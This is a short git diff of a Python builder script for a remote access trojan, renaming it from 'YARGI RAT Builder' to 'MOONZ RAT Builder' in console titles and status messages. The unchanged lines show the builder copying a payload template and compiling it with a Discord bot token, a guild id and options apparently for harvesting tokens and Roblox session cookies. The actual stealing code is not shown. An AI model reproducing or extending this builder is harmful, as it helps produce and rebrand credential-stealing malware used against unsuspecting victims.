@@ -70,7 +70,7 @@ os.system("""title "YARGI RAT Builder | Warning | Unlicensed"
 """)
 pause()
 clear()
-os.system("""title "YARGI RAT Builder | Configuration | Unlicensed"
+os.system("""title "MOONZ RAT Builder | Configuration | Unlicensed"
 """)
 print(colored(ascii_art, 'white'))
 print(colored("-"*75,'red'))
@@ -97,10 +97,10 @@ if prompt.lower() == "y":
     pass
 elif prompt.lower() == "n":
     exit()
-os.system("""title "YARGI RAT Builder | Compiling | Unlicensed"
+os.system("""title "MOONZ RAT Builder | Compiling | Unlicensed"
 """)
 clear()
-print(colored("Started compiling YARGI-RAT configuration...", 'green'))
+print(colored("Started compiling MOONZ RAT configuration...", 'green'))
 shutil.copy(samplefile, "build\main.py")
 builder = Builder(token=token,guild_id=guildid,announc=annc,passw=passw,tokens=tokens,roblosec=roblosecurity)
 builder.build()
@@ -113,6 +113,6 @@ os.remove("build\main.py")
 shutil.rmtree("dist")
 shutil.rmtree("build")
 os.remove("Client-built.spec")
-os.system("""title "YARGI RAT Builder | Built | Unlicensed"
+os.system("""title "MOONZ RAT Builder | Built | Unlicensed"
 """)
 pause()
